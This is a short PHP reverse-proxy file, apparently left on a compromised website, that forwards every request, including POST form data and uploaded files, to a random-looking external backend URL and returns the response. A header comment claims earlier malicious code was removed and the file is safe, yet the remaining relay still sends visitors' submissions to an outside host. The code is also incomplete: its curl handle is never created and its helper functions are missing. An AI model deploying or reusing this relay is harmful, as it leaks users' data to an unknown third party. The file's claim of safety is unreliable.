<?PHP

$backend_url = "https://n4w3o.x9hgs.co.uk/ts/5kgl455a7545/api/";

/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

curl_setopt( $curl, CURLOPT_HTTPHEADER, getRequestHeaders() );
curl_setopt( $curl, CURLOPT_FOLLOWLOCATION, true ); # follow redirects
curl_setopt( $curl, CURLOPT_HEADER, true ); # include the headers in the output
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true ); # return output as string

if ( strtolower($_SERVER['REQUEST_METHOD']) == 'post' ) {
    curl_setopt( $curl, CURLOPT_POST, true );
    $post_data = file_get_contents("php://input");

    if (preg_match("/^multipart/", strtolower($_SERVER['CONTENT_TYPE']))) {
        $delimiter = '-------------' . uniqid();
        $post_data = build_multipart_data_files($delimiter, $_POST, $_FILES);
        curl_setopt( $curl, CURLOPT_HTTPHEADER, getRequestHeaders($delimiter) );
    }

    curl_setopt( $curl, CURLOPT_POSTFIELDS, $post_data );
}
  
$contents = curl_exec( $curl ); # reverse proxy. the actual request to the backend server.
curl_close( $curl ); # curl is done now


$contents = preg_replace('/^HTTP\/1.1 3.*(?=HTTP\/1\.1)/sm', '', $contents); # remove redirection headers
list( $header_text, $contents ) = preg_split( '/([\r\n][\r\n])\\1/', $contents, 2 );

$headers_arr = preg_split( '/[\r\n]+/', $header_text ); 
  
// Propagate headers to response.


print $contents; # return the proxied request result to the browser

?>